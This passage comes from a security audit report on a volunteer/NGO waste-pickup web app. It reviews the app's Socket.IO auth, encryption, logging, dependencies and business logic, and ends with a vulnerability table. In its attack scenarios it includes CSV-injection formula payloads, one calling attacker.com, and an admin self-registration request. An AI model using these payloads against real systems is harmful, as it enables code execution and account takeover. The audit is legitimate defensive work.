The frontend component template files (`.html` files inside features/) were not inspected as part of this audit pass (they exist but are large). Angular's `{{ }}` interpolation auto-escapes HTML. The risk is if `[innerHTML]` is used.

**IMPORTANT:** This must be audited separately. Search all `.html` files for `innerHTML` and `[innerHTML]`.

### 19.3 localStorage `user` object — Trust boundary

The `user` object in localStorage is loaded on app startup (`getUserFromStorage()`) and used as the "current user" signal. If an attacker can manipulate localStorage (only possible via XSS), they could set a fake role. However, **the backend always re-validates role from the DB via `protect` middleware**, so client-side role manipulation has no server-side effect. The frontend guards are convenience-only.

---

## 20. Frontend Authentication Guards

**VERIFIED — authGuard:** Checks `authService.isLoggedIn()` which reads from signal initialized by `getUserFromStorage()`. This reads `localStorage.getItem('user')`. If token is not set but user object is, the guard passes but all API calls fail with 401. **Acceptable.**

**VERIFIED — adminGuard, ngoGuard, volunteerGuard:** All implemented and read from `authService.getCurrentUser()`.

**IMPORTANT — Guards are NOT security boundaries.** They are UI-layer UX protection. The backend is the actual security boundary. This has been confirmed — all sensitive backend routes have `protect` + `authorize()`.

**GAP — No admin routes are guarded by `adminGuard` in app.routes.ts:**

Looking at [app.routes.ts](file:///d:/Coding/WasteZero3/Milestone3/Frontend/src/app/app.routes.ts), there is NO admin-specific route at all. The admin guard exists (`admin.guard.ts`) but is not registered on any route in the current routing file. This makes sense because Milestone 4 admin routes haven't been added yet.

**For Milestone 4:** Admin routes MUST be guarded by `adminGuard` on the frontend AND `authorize('admin')` on the backend.

---

## 21. Sensitive Data Exposure

**VERIFIED — No secrets hardcoded in source files.**

**VERIFIED — `.env` in `.gitignore`:**

File: [.gitignore](file:///d:/Coding/WasteZero3/Milestone3/Backend/.gitignore)

(Based on the file listing, `.gitignore` is 869 bytes and present.)

**VERIFIED — `.env.example` contains only placeholder values:**

```
JWT_SECRET=your_jwt_secret_key_min_32_chars
CHAT_ENCRYPTION_KEY=your_64_char_hex_encryption_key_here
MONGO_URI=mongodb+srv://your_user:your_password@...
```
No real secrets in the example file.

**MEDIUM — Weak JWT_SECRET guidance:**

The `.env.example` says `JWT_SECRET=your_jwt_secret_key_min_32_chars`. The comment "min 32 chars" is helpful but there is no runtime validation that enforces this. A developer who sets `JWT_SECRET=secret` would have a critically weak signing key.

**MEDIUM — MongoDB host logged on connection:**

File: [db.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/config/db.js#L9)
```javascript
console.log(`[MongoDB] Connected: ${conn.connection.host}`);
```
This logs the MongoDB host to stdout. In a CI/CD pipeline with log capture, this could expose internal infrastructure details.

**VERIFIED — console.error logs in controllers:**

Multiple controllers do `console.error('Login Error:', error)` and `console.error('Register Error:', error)`. In production, `error` objects can include stack traces and MongoDB error details. **In development** this is useful but in production should go through a structured logger (e.g., Winston, Pino) that filters sensitive data.

**VERIFIED — Error middleware in production:**

File: [error.middleware.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/middlewares/error.middleware.js#L55-L72)

Correctly omits stack traces in production (`if (!isProduction) { ... stack ... }`). **Well done.**

---

## 22. Socket.IO Security Audit

### 22.1 Authentication [VERIFIED — GOOD]

File: [socket.middleware.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/sockets/socket.middleware.js)

```javascript
const socketAuthMiddleware = async (socket, next) => {
  let rawToken = socket.handshake.auth?.token || socket.handshake.query?.token;
  if (!rawToken) return next(new Error('Access denied. No token provided.'));
  const decoded = jwt.verify(rawToken, process.env.JWT_SECRET);
  const user = await User.findById(decoded.id).select('-password').lean();
  if (!user) return next(new Error('User no longer exists.'));
  socket.user = { ...user, id: user._id.toString() };
  next();
};
```

- JWT verification required before connection — **correct**.
- DB lookup performed — role comes from DB, not JWT payload — **correct**.
- Unauthenticated connections are rejected — **correct**.

**MEDIUM — Query parameter token leakage:**

The middleware accepts the token from `socket.handshake.query?.token`. Passing JWT in URL query parameters means it appears in server access logs (HTTP upgrade request URL). This is a secondary path (`auth.token || query.token`). The Angular client uses `auth: { token: ... }` (not query params), so this is only triggered by direct/manual connections. Consider removing the query param fallback.

### 22.2 Authorization [VERIFIED — GOOD]

**Can User A join User B's room?** No. On connection, `socket.join(getUserRoom(socket.user.id))` — the room is derived from the authenticated user's own ID. There is no event that allows joining an arbitrary room.

**Can User A send a message pretending to be User B?** No.

File: [message.events.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/sockets/events/message.events.js#L45-L49)

```javascript
const message = await messageService.createMessage({
  sender_id: socket.user.id,  // from authenticated socket, not client payload
  sender_role: socket.user.role,
  receiver_id: receiverId,
  content,
});
```

`sender_id` is always taken from `socket.user.id` (server-validated), never from the client payload. **Correct design.**

### 22.3 Message Validation [VERIFIED — GOOD]

`assertValidSendPayload` validates:
- Payload is an object
- `receiverId` is a valid ObjectId string
- `content` is a non-empty string
- `content.length <= 2000`

### 22.4 Conversation Participation Check [VERIFIED — GOOD]

In `message:read` event (lines 99-102):
```javascript
const participantIds = conversationId.split('_');
if (participantIds.length !== 2 || !participantIds.includes(socket.user.id)) {
  throw new Error('You are not a participant in this conversation');
}
```
This correctly prevents marking other users' conversations as read.

**MEDIUM — `conversationId.split('_')` is fragile:** If a user ID somehow contained `_`, the split would produce unexpected results. MongoDB ObjectIds are hex-only (no `_`), so this is currently safe but fragile by design.

### 22.5 Rate Limiting on Socket [VERIFIED — GOOD]

`messageLimiter.consume(socket.user.id)` — 20 messages per 10 seconds. Reasonable.

---

## 23. Chat Security

**VERIFIED — Message sender is verified from socket identity:** `sender_id: socket.user.id` — not client-supplied.

**VERIFIED — Messaging restricted to Volunteer ↔ NGO:**

File: [message.service.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/services/message.service.js#L21-L26)

```javascript
const isVolunteerToNgo = sender_role === 'volunteer' && receiver.role === 'ngo';
const isNgoToVolunteer = sender_role === 'ngo' && receiver.role === 'volunteer';
if (!isVolunteerToNgo && !isNgoToVolunteer) {
  throw new Error('Messaging is only allowed between Volunteers and NGOs');
}
```
Admin cannot be a message participant. **Correct for the domain.**

**MEDIUM — `GET /api/messages?with=userId` — No participation validation:**

File: [message.controller.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/controllers/message.controller.js#L28-L35)

`getMessagesBetween(req.user.id, req.query.with)` — if User A (volunteer) and User C (admin) have never messaged, the system builds `conversationId = sort([A, C]).join('_')` and queries `Message.find({ conversation_id: conversationId })`. This returns `[]` (no messages exist). **No actual data leak.** But an NGO could also call `GET /api/messages?with=<anotherNgoId>` — the role restriction is enforced at message-CREATION but not at message-RETRIEVAL. Any authenticated user can query the message history between themselves and anyone. This returns empty if they never messaged, but if they somehow share a `conversationId` (they shouldn't) it could expose messages.

This is **theoretical** with the current conversation ID scheme, but should be explicitly validated.

---

## 24. Encryption Audit

**VERIFIED — AES-256-GCM used for messages and notifications.**

File: [crypto.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/utils/crypto.js)

- Algorithm: `aes-256-gcm` — **correct, authenticated encryption.**
- Key: 32 bytes (256 bits), loaded from `CHAT_ENCRYPTION_KEY` environment variable.
- IV: `crypto.randomBytes(12)` — 96 bits, standard for GCM mode. **Correct.**
- Auth tag: Captured and stored — **correct GCM usage.**
- Startup validation: If key is missing or not 64 hex chars, `process.exit(1)` — **fail-fast.**

**IMPORTANT — This is NOT End-to-End Encryption:**

The server holds the encryption key and decrypts every message server-side before emitting over Socket.IO or returning via REST API. This is **Application-Level Encryption at Rest** — protecting the database from a breach but not the server process. An attacker with server access can decrypt all messages.

This is the correct architecture for a platform where the server needs to decrypt (e.g., for moderation in Milestone 4). Do not call this "end-to-end encryption" in documentation.

**MEDIUM — Single symmetric key for all users:**

All messages are encrypted with the same `CHAT_ENCRYPTION_KEY`. A single key exposure compromises all historical messages. Per-user or per-conversation key derivation would improve this, but adds significant complexity. For academic context, this is acceptable.

**VERIFIED — IV uniqueness:** `crypto.randomBytes(12)` generates a fresh 96-bit random IV per message. GCM security requires IV uniqueness per key; with 96-bit random IVs and a 32-byte key, collision probability is negligible.

**LOW — No key rotation mechanism:** If the key is compromised, there is no mechanism to re-encrypt all messages with a new key. For production, key versioning should be implemented.

---

## 25. Notification Security

**VERIFIED — Notification ownership enforced:** `markNotificationRead` uses `findOneAndUpdate({ _id: id, user_id: userId })` — a user can only mark their own notifications.

**VERIFIED — Notifications are user-scoped at read:** `listForUser(userId, ...)` always includes `user_id: userId` filter.

**VERIFIED — Socket notification delivery scoped by user room:** `getIO().to(getUserRoom(user_id)).emit(...)` — sent only to the recipient's room.

**LOW — `reference_id` is Schema.Types.Mixed:** This allows any type of value (ObjectId, string, null). No validation at schema level ensures consistency.

---

## 26. Pickup Security

**VERIFIED — Pickup creation: volunteer only, owner forced from session.**

**VERIFIED — Pickup update: volunteer + owner middleware.**

**VERIFIED — Pickup status transition: atomic with optimistic concurrency.**

File: [pickup.service.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/services/pickup.service.js#L174-L188)

```javascript
const filter = { _id: pickupId, status: fromStatus };
if (fromStatus === 'Assigned') filter.agent_id = ngoId;
return await Pickup.findOneAndUpdate(filter, update, { new: true });
```
This prevents race conditions — if another request changed the status between read and write, `findOneAndUpdate` returns null. The controller handles null (409 response). **Excellent design.**

**MEDIUM — NGO can set themselves as agent on any Pending pickup:**

`transitionPickupStatus` sets `agent_id = ngoId` when transitioning to Assigned. The check in `checkPickupNgoMatch` validates NGO eligibility via city+wasteType matching. However, if a smart NGO sets up their profile to match many cities/wasteTypes, they can "claim" pickups from users in areas they don't actually serve.

**LOW — No validation that `wasteTypes` on pickup match any enumerated set.** Any string is accepted.

---

## 27. Opportunity Security

**VERIFIED — NGO cannot modify another NGO's opportunity:** `checkOpportunityOwnership` enforces this.

**VERIFIED — Admin can delete any opportunity:** By design. Admin bypass in `checkOpportunityOwnership`. Currently hard-delete (no soft-delete, no audit log).

**MEDIUM — Opportunity hard-delete without audit trail:**

File: [opportunity.service.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/services/opportunity.service.js#L132-L143)

```javascript
await Application.deleteMany({ opportunity_id: id }); // cascade delete applications
await deleteCloudinaryAsset(opportunity.imagePublicId);
return await opportunity.deleteOne();
```

An admin can permanently and silently delete any NGO's opportunity including all its applications. No log is created. For Milestone 4, this must be changed to soft-delete with `AdminLog` entry.

**VERIFIED — Open opportunities can be applied to by any authenticated volunteer.**

**MEDIUM — Volunteer can apply to a soft-deleted opportunity (if M4 introduces it):**

Currently, opportunities are hard-deleted so this is not an issue. But when M4 adds `isRemovedByAdmin`, the `applyForOpportunity` controller must also check `!opportunity.isRemovedByAdmin`.

---

## 28. Application Security

**VERIFIED — Duplicate application prevention:** App-level check + unique compound index `{opportunity_id, volunteer_id}`.

**VERIFIED — Volunteer cannot accept their own application:** Status change is restricted to `ngo/admin` role by `authorize("ngo", "admin")` in routes.

**VERIFIED — Volunteer cannot withdraw an accepted application:** Controller checks `req.application.status !== "pending"` before withdrawal.

**VERIFIED — NGO can only update applications for their own opportunities:** `checkApplicationOwnershipByNGO` enforces this via cross-reference to opportunity ownership.

**MEDIUM — Admin can accept or reject any application:**

As noted in RBAC section, `authorize("ngo", "admin")` + `checkApplicationOwnershipByNGO` (which exempts admin) means admin can change any application's status. This may be intended for admin oversight but could be used to accept/reject applications on behalf of an NGO without their knowledge.

---

## 29. File / URL Security

**VERIFIED — Image upload security:**

File: [upload.middleware.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/middlewares/upload.middleware.js)

- MIME type check: `file.mimetype.startsWith('image/')` — only images accepted.
- Size limit: 5 MB hard cap via `limits: { fileSize: 5 * 1024 * 1024 }`.
- Memory storage only — no disk writes.
- Cloudinary upload as a managed CDN — no server-side file storage.

**LOW — MIME type can be spoofed:** `file.mimetype` comes from the multipart `Content-Type` header which clients control. A malicious file with `.html` content but `image/jpeg` MIME would pass the check. Cloudinary then processes it and would likely reject or correctly classify it, but the backend doesn't verify the magic bytes. For production, consider `file-type` package to verify magic bytes in the buffer.

**VERIFIED — URL injection prevention in upload middleware:**

```javascript
if (!req.file) {
  delete req.body.image;      // strips client-supplied image URLs
  delete req.body.imagePublicId;
  return next();
}
```
This prevents attackers from injecting their own `image` URL into `req.body`. **Well done.**

**VERIFIED — No SSRF risk from image handling:** Images go through Cloudinary SDK, not through a server-side URL fetch. SSRF via Cloudinary SDK is a Cloudinary responsibility, not a direct application vulnerability.

---

## 30. Reporting Security (Milestone 4 Future)

**NOT YET IMPLEMENTED.** Reporting module is planned for Milestone 4.

**HIGH — If report endpoints are not role-restricted, any user can download all platform data.**

**HIGH — If report generation is unbounded, a single request can exhaust server memory.**

See Section 40 (Milestone 4 Future Risks) for detailed analysis.

---

## 31. CSV / Excel / PDF Security (Milestone 4 Future)

**NOT YET IMPLEMENTED.**

**HIGH — CSV Injection risk if user-controlled strings are not sanitized.**

Fields at risk include: `user.bio`, `opportunity.description`, `opportunity.title`, `user.name`. If these contain leading characters like `=`, `+`, `-`, `@`, a malicious user could craft:
```
name: "=HYPERLINK(\"http://attacker.com\",\"Click me\")"
```
When exported to CSV and opened in Excel, this formula executes.

**Fix:** Prefix all fields with a tab character `\t` or wrap in double quotes with formula prefix detection.

---

## 32. DoS / Resource Exhaustion

### VERIFIED Issues:

**HIGH — Search and filter without limit:**

```javascript
// opportunity.service.js line 156
return await Opportunity.find({ $or: [...] }).sort({ createdAt: -1 }).lean(); // NO LIMIT
// opportunity.service.js line 183
return await Opportunity.find(queryFilter).sort(sortObj).lean(); // NO LIMIT
```

A single `GET /api/opportunities/search?q=a` could load all opportunities from MongoDB into Node.js heap.

**HIGH — getConversationsForUser aggregation — unbounded:**

File: [message.service.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/services/message.service.js#L107-L130)

```javascript
const conversations = await Message.aggregate([
  { $match: { $or: [{ sender_id: userObjectId }, { receiver_id: userObjectId }] } },
  { $sort: { createdAt: -1 } },
  { $group: { _id: '$conversation_id', lastMessage: { $first: '$$ROOT' } } },
  { $sort: { 'lastMessage.createdAt': -1 } },
]);
```

No `$limit` stage. For a user with thousands of messages, this aggregation loads everything.

**MEDIUM — getMyApplications without pagination:**

File: [application.controllers.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/controllers/application.controllers.js#L279-L283)

```javascript
const applications = await Application.find({ volunteer_id: req.user.id })
  .populate('opportunity_id')
  .lean();
```

No pagination, no limit. A volunteer with hundreds of applications loads all of them.

**MEDIUM — Request body limit is 2MB:**

A JSON body of 2MB is large. An attacker can send near-2MB payloads to any POST endpoint. This is mitigated by the body parser limit but could stress-test JSON parsing.

**HIGH — Future Milestone 4 report generation without streaming:**

If report generation uses `User.find().lean()` to load all users into memory before generating CSV, a database with 50,000 users could exhaust Node.js heap.

---

## 33. Database Performance

| Query | Current Index | Performance Issue | Recommended Fix |
|---|---|---|---|
| `searchOpportunities` full text | `{title:'text', description:'text'}` | Returns ALL matches, no limit | Add `.limit(50)` |
| `filterOpportunities` | `{status:1, createdAt:-1}` | No limit on results | Add `.limit(100)` |
| `listConversationsForUser` aggregation | `{conversation_id:1, createdAt:-1}` | No `$limit` in pipeline | Add `{$limit: 50}` stage |
| `getApplications` for admin (no scope) | `{opportunity_id:1}` | All applications returned | Enforce pagination for admin |
| `getMyApplications` | `{volunteer_id:1}` index | No limit, full load | Add `.limit(100)` |
| `getAllPickups` for admin | `{status:1}` | All pickups returned (paginated) | Already paginated via `buildQuery` — OK |
| `getPickupsForNgo` | `{status:1, address.city:1}` | `$in` with regex array — expensive | Pre-normalize cities to lowercase at write time |

---

## 34. Error Handling

**VERIFIED — Global error handler implemented:**

File: [error.middleware.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/middlewares/error.middleware.js)

Normalizes: Mongoose `ValidationError`, `CastError`, duplicate key `11000`, JWT errors, Multer errors.

**Production safety:** `if (isProduction && statusCode === 500) { message = 'An unexpected error occurred...' }` — **correct**.

**MEDIUM — Stack trace included in development responses:**

```javascript
if (!isProduction) {
  responseBody.error = err.name;
  if (err.stack) responseBody.stack = err.stack.split('\n').slice(0, 6).join('\n');
}
```

If `NODE_ENV` is not explicitly set to `'production'` in staging/UAT environments, stack traces are returned. Developers sometimes test with `NODE_ENV=development` against real databases.

**MEDIUM — Some controllers return `error.message` in dev:**

Several `sendError(res, 'Failed to ...', 500, error.message)` calls. The `errors` field of the `sendError` response includes `error.message`. In production this may reveal internal error messages (e.g., MongoDB path details, service names).

---

## 35. Logging

**VERIFIED — No structured logging library (Winston/Pino) installed.** All logging via `console.log/error`.

**MEDIUM — `console.error('Login Error:', error)` exposes full error objects:**

In Node.js, logging a full `Error` object to console outputs `name`, `message`, and potentially `stack`. In containerized environments where stdout is aggregated, this is readable in plain text.

**VERIFIED — No passwords or tokens in current console logs.**

**LOW — MongoDB host logged on connect:** Already noted.

**LOW — Socket.IO connection ID logged:** `console.log('[Socket] Connected:', this.socket?.id)` in the Angular frontend. Not a server-side concern, but visible in browser devtools.

---

## 36. Dependency Security

### Backend package.json Dependencies

| Package | Version | Notes |
|---|---|---|
| `bcryptjs` | ^3.0.3 | Latest stable. |
| `cloudinary` | ^2.10.0 | Recent. |
| `cors` | ^2.8.6 | Maintained. |
| `dotenv` | ^17.4.2 | Recent. |
| `express` | ^5.2.1 | **Express 5 is RC/stable. Some middleware not yet compatible.** |
| `express-rate-limit` | ^8.5.2 | Recent. |
| `express-validator` | ^7.3.2 | Recent. |
| `helmet` | ^8.2.0 | Recent. |
| `jsonwebtoken` | ^9.0.3 | Stable. |
| `mongoose` | ^9.7.3 | Recent. |
| `multer` | ^2.2.0 | Recent (Multer 2 has breaking changes from v1). |
| `nodemailer` | ^9.0.3 | Recent. |
| `rate-limiter-flexible` | ^11.2.0 | Recent. |
| `socket.io` | ^4.8.3 | Recent. |
| `socket.io-client` | ^4.8.3 | **Should not be in production backend dependencies.** |

**MEDIUM — `socket.io-client` in production backend dependencies:**

`socket.io-client` is a client library. It should not be in the backend's `dependencies` — it should either be `devDependencies` or removed if not actually used. Its presence inflates the production bundle and could be a version mismatch source.

**MEDIUM — Express 5 in production:**

Express 5 (`^5.2.1`) is the latest major version but changed error handling behavior (async errors now propagate automatically). The codebase appears to rely on manual `try/catch` in controllers rather than `next(err)`, so Express 5's auto-catch may behave differently in edge cases.

**LOW — Not verified via `npm audit`:** No audit was run during this review. Running `npm audit` in the project directory would reveal any known CVEs in the current dependency tree.

---

## 37. Environment Security

**VERIFIED — `.env.example` has no real secrets:** Confirmed.

**VERIFIED — `.gitignore` is present:** `869 bytes` — reasonable size for Node project.

**VERIFIED — `CHAT_ENCRYPTION_KEY` has startup validation:** `process.exit(1)` if key is malformed.

**MEDIUM — `JWT_SECRET` has no startup validation:** No runtime check that `JWT_SECRET` meets minimum security requirements (length, entropy).

**MEDIUM — `MONGO_URI` is logged in hostname form:** `conn.connection.host` logged — minor internal infrastructure leakage.

**MEDIUM — Only one `environment.ts` file:** No `environment.prod.ts`. The Angular build would use the same development environment file for production, pointing to `http://localhost:5001`. This is expected in academic milestones but must be configured for deployment.

---

## 38. API Response Security

**VERIFIED — Password never in responses:** `select: false` + `toSafeUser()` helper used consistently.

**VERIFIED — Message IV/authTag stripped from responses:**

In `message.service.js` and `notification.service.js`, both return:
```javascript
{ ...msg, content: decryptedContent, iv: undefined, authTag: undefined }
```
Cryptographic internals are never sent to clients.

**LOW — User `isVerified` field exposed in user object:**

In login response (auth.controllers.js line 167) and `toSafeUser()` (users.controllers.js line 23), `isVerified` is included. This is low risk but unnecessary to expose to the user themselves — they know they're verified because they're logged in.

**LOW — `role` field included in conversation partner listing:**

`message.service.js` line 162: `User.find(...).select('name email role')`. Role is exposed in conversation listing. This is acceptable for a messaging UI (to show NGO/volunteer labels) but is an information disclosure if roles are considered sensitive.

---

## 39. Business Logic Security

### VERIFIED Issues:

**MEDIUM — Pickup cancellation only works while `Pending`:**

`cancelPickup` controller (line 132): `if (req.pickup.status !== 'Pending') return sendError(...)`. This is correct — assigned pickups cannot be cancelled by volunteer. However, there is no mechanism for a volunteer to cancel an `Assigned` pickup — only the NGO can transition from `Assigned` to `Cancelled`. This could strand a volunteer with no way to exit a pickup they can no longer fulfill.

**MEDIUM — No check if target user exists before messaging:**

In `message.service.js`, `createMessage` checks `User.findById(receiver_id)` but there's no check that the receiver hasn't been suspended (future Milestone 4 concern).

**LOW — Admin can complete a pickup that has never been assigned:**

Looking at `ALLOWED_TRANSITIONS` in pickup.model.js:
```javascript
const ALLOWED_TRANSITIONS = {
  Pending: ['Assigned', 'Cancelled'],
  Assigned: ['Completed', 'Cancelled'],
};
```
Admin currently uses `getAllPickups` (read-only for admin — there's no admin status-update route currently). The NGO `updatePickupStatus` uses `canNgoTransitionTo` which enforces proper transitions. **Currently safe.** For Milestone 4 admin override, this must follow the same state machine.

**LOW — An NGO matching city+wasteType can claim any volunteer's pickup:**

The matching is geographic/categorical, not relationship-based. A new NGO that sets `wasteTypes: ["Plastic"]` and `locations.primary.city: "Boston"` would see all Boston plastic pickups from all volunteers — even those the volunteer might prefer a specific NGO for. This is by design but could lead to "squatting" on popular pickups.

**HIGH — OTP for registration stored with full plaintext password hash in payload:**

File: [auth.controllers.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/controllers/auth.controllers.js#L67-L73)

```javascript
const pendingPayload = {
  name: name.trim(),
  username: username.trim().toLowerCase(),
  email: email.trim().toLowerCase(),
  password: hashedPassword,  // bcrypt hash stored in Otp collection
  role,
};
await issueOtp(email.trim().toLowerCase(), 'verify', pendingPayload);
```

The OTP document (`otp.model.js`) has `payload: Schema.Types.Mixed` which stores `{ password: hashedPassword }`. The bcrypt hash of the password is stored in the `Otp` collection.

**Risk:** If an attacker gains read access to the `Otp` collection, they get bcrypt hashes. Bcrypt hashes are computationally hard to crack but this is unnecessary data exposure.

**TTL protection:** Pending registration documents have a 5-hour TTL (`PENDING_REGISTRATION_TTL_MS`). After TTL expiry, MongoDB automatically deletes the document.

**Severity: MEDIUM** — bcrypt hash exposure is not critical (hash is hard to crack) but violates least-privilege for database access.

---

## 40. Milestone 4 Future Risks

| Feature | Current State | Future Risk | Severity | Preventive Design |
|---|---|---|---|---|
| Admin Dashboard | Not implemented | Statistics aggregations without limits could cause collection scans | HIGH | Add `$limit` to all aggregation pipelines; add proper compound indexes |
| User Suspension | `isSuspended` field not in User model | Login doesn't check suspension after M4 adds field — suspended users can still log in with existing token | HIGH | Add suspension check to `protect` middleware AND login; implement token blacklist or short TTL |
| Opportunity Removal | Currently hard-delete by admin | Permanent data loss; no audit trail; cascade-deletes applications | HIGH | Change to soft-delete: `isRemovedByAdmin`, `removedAt`, `removedBy`, `removalReason` fields; write `AdminLog` entry |
| Admin Logs | No AdminLog model or collection | Admin actions completely unaudited | HIGH | Implement AdminLog collection before any Milestone 4 admin write endpoint goes live |
| Statistics APIs | Not implemented | Expensive aggregations without indexes or limits; no rate limiting | HIGH | Pre-create all required indexes; add `$limit`/`$skip`; add rate limiter to stats endpoints |
| Reports (CSV) | Not implemented | CSV injection from user-controlled fields; no ownership scoping | HIGH | Sanitize formula-injecting characters; restrict to admin; add rate limiter |
| Reports (Excel) | Not implemented | Same as CSV; ExcelJS could OOM on large datasets without streaming | HIGH | Use ExcelJS streaming writer; paginate data fetch; enforce max row limits |
| Reports (PDF) | Not implemented | If using HTML-to-PDF (Puppeteer), SSRF and HTML injection risk | CRITICAL | Avoid Puppeteer; use PDFKit with server-side data only; never render user HTML |
| Admin Self-Registration | Currently allowed via public API | Attackers on fresh deployments can self-register as admin | HIGH | Remove `admin` from `allowedRoles` in public register; add `/api/auth/admin/setup` endpoint with initialization token |
| Audit Log Integrity | Not implemented | AdminLogs could be modified or deleted by a compromised admin account | MEDIUM | AdminLogs should be append-only; no DELETE or UPDATE routes; consider separate DB user with insert-only permissions |

---

## 41. Critical / High Vulnerabilities (Attack Scenarios)

### VUL-001: Admin Self-Registration [HIGH]

```
Attack:
1. Attacker discovers the WasteZero API (e.g., from a public URL or leaked endpoint).
2. Attacker sends POST /api/auth/register with:
   { "name": "Hacker", "username": "hacker", "email": "hacker@evil.com",
     "password": "Hack@1234", "role": "admin" }
3. If no admin exists yet (fresh deployment), the request succeeds.
4. Attacker verifies OTP, creates an admin account.
5. Attacker has full admin access to: all pickups, all applications, all opportunities.
6. Via future M4 endpoints: all user data, all reports, suspension controls.

Impact:
Complete platform compromise. Admin can view all data, suspend legitimate users,
delete NGO opportunities, download user PII in reports.

Fix:
Remove 'admin' from allowedRoles in the public registration flow.
Create a separate protected admin setup endpoint (e.g., POST /api/admin/setup)
that accepts an ADMIN_INIT_SECRET from the environment.
```

### VUL-002: Unbounded Search DoS [HIGH]

```
Attack:
1. Attacker (any authenticated user) sends:
   GET /api/opportunities/search?q=a
2. MongoDB performs a text-indexed or regex search.
3. If 10,000 opportunities match, all 10,000 documents are loaded into Node.js heap.
4. Node.js heap exhaustion causes OOM crash or severe slowdown.
5. Repeated every 30 seconds = sustained DoS against the API server.

Impact:
API unavailability for all users.

Fix:
Add .limit(50) to searchOpportunities and filterOpportunities.
Add rate limiting middleware to search endpoints.
```

### VUL-003: Suspended User Access After Milestone 4 [MEDIUM]

```
Attack (future):
1. User commits a violation. Admin suspends their account (M4 feature).
2. The user still has a valid 7-day JWT token.
3. User's existing token passes JWT verification and DB lookup.
4. The protect middleware does NOT check isSuspended (it doesn't exist yet).
5. User continues to access all authenticated endpoints, schedule pickups, apply for opportunities, send messages.

Impact:
Suspension enforcement is bypassed for up to 7 days.

Fix:
In protect middleware, after User.findById, add:
  if (user.isSuspended) return res.status(403).json({ ... suspension reason ... });
Also add suspension check in loginUser before issuing JWT.
```

### VUL-004: CSV Injection [MEDIUM]

```
Attack (future Milestone 4):
1. Attacker registers with name: "=CMD|'/C calc'!A0"
2. Platform grows; admin downloads users CSV report.
3. Admin opens file in Microsoft Excel (security warning may appear but users often dismiss).
4. Formula executes on admin's machine.
5. With more sophisticated payloads: data exfiltration, file system access.

Impact:
Code execution on admin's machine when opening the CSV report.

Fix:
Before writing any field to CSV, check if value starts with =, +, -, @
and prefix with \t or replace with sanitized version.
```

---

## 42. Complete Vulnerability Table

| ID | Severity | Component | File | Line | Vulnerability | Recommended Fix |
|---|---|---|---|---|---|---|
| SEC-001 | HIGH | Backend/Auth | auth.controllers.js | 22 | Public admin self-registration | Remove 'admin' from public registration allowedRoles |
| SEC-002 | HIGH | Backend/DoS | opportunity.service.js | 156, 183 | Unbounded search/filter queries — no `.limit()` | Add `.limit(50)` to all list queries without pagination |
| SEC-003 | HIGH | Backend/DoS | message.service.js | 107 | Conversation aggregation pipeline without `$limit` | Add `{$limit: 50}` to aggregation |
| SEC-004 | MEDIUM | Backend/Auth | auth.controllers.js | 105 | Login does not check suspension (M4 future) | Add `isSuspended` check in `protect` middleware and login |
| SEC-005 | MEDIUM | Backend/JWT | generateToken.js | 6 | JWT valid 7 days with no revocation on password change | Add `passwordChangedAt` + token validation; consider shorter expiry |
| SEC-006 | MEDIUM | Backend/Auth | auth.controllers.js | 65 | Bcrypt hash of pending user stored in OTP collection | Design limitation; mitigated by OTP TTL. Document risk. |
| SEC-007 | MEDIUM | Frontend/Storage | auth.service.ts | 232 | JWT stored in localStorage — XSS-theft vector | Consider moving to memory-only or HttpOnly cookies (requires arch change) |
| SEC-008 | MEDIUM | Backend/RateLimit | rateLimiter.middleware.js | All | Rate limiters in-memory — not distributed-safe | Use Redis-backed rate limiter for production |
| SEC-009 | MEDIUM | Backend/RateLimit | (missing) | N/A | No rate limiting on search, filter, conversations, notifications | Add `generalLimiter` to these endpoints |
| SEC-010 | MEDIUM | Backend/Search | opportunity.service.js | 153 | Search `q` parameter has no length limit | Add max length validation on `q` |
| SEC-011 | MEDIUM | Backend/Logging | multiple controllers | N/A | `console.error(..., error)` logs full error objects | Replace with structured logger; filter error.message for sensitive data |
| SEC-012 | MEDIUM | Backend/Upload | upload.middleware.js | 22 | MIME type check only — no magic byte verification | Add file-type library for buffer-based MIME verification |
| SEC-013 | MEDIUM | Backend/Admin | opportunity.service.js | 132 | Admin hard-delete of opportunities without audit trail | Change to soft-delete + AdminLog before M4 |
| SEC-014 | MEDIUM | Backend/Admin | application.routes.js | 68 | Admin can update any application status | Document if intended; add AdminLog for admin-initiated status changes |
| SEC-015 | MEDIUM | Socket.IO | socket.middleware.js | 12 | Token accepted from URL query param (logged by servers) | Remove `socket.handshake.query?.token` fallback |
| SEC-016 | MEDIUM | Backend/JWT | - | N/A | No startup validation that JWT_SECRET meets minimum entropy | Add `JWT_SECRET` length validation on startup |
| SEC-017 | MEDIUM | Backend/Pickup | pickup.validation.js | 86 | wasteTypes accepts any string — no allowlist | Add enum allowlist to validation and schema |
| SEC-018 | LOW | Backend/Rate | rateLimiter.middleware.js | 8 | Login allows 20 attempts per 15 min — too permissive | Reduce to 5–10 attempts per 15 minutes |
| SEC-019 | LOW | Backend/CORS | corsOrigin.js | 4 | No format validation on CLIENT_URL env var | Validate CLIENT_URL is a valid HTTP/HTTPS URL on startup |
| SEC-020 | LOW | Frontend/CSP | index.html | N/A | No Content-Security-Policy on Angular frontend | Add CSP meta tag to Angular index.html |
| SEC-021 | LOW | Backend/Logging | db.js | 9 | MongoDB host logged to stdout | Use structured logger; omit host in production |
| SEC-022 | LOW | Backend/Deps | package.json | 26 | `socket.io-client` in production backend deps | Move to devDependencies or remove if unused |
| SEC-023 | LOW | Backend/Crypto | crypto.js | N/A | Single symmetric key for all messages | Document limitation; plan for key versioning |
| SEC-024 | LOW | Backend/Business | application.controllers.js | 279 | `getMyApplications` has no pagination | Add pagination via `buildQuery` |
| SEC-025 | INFO | Backend/JWT | generateToken.js | 9 | `role` embedded in JWT (redundant, DB authoritative) | Consider removing `role` from JWT payload |
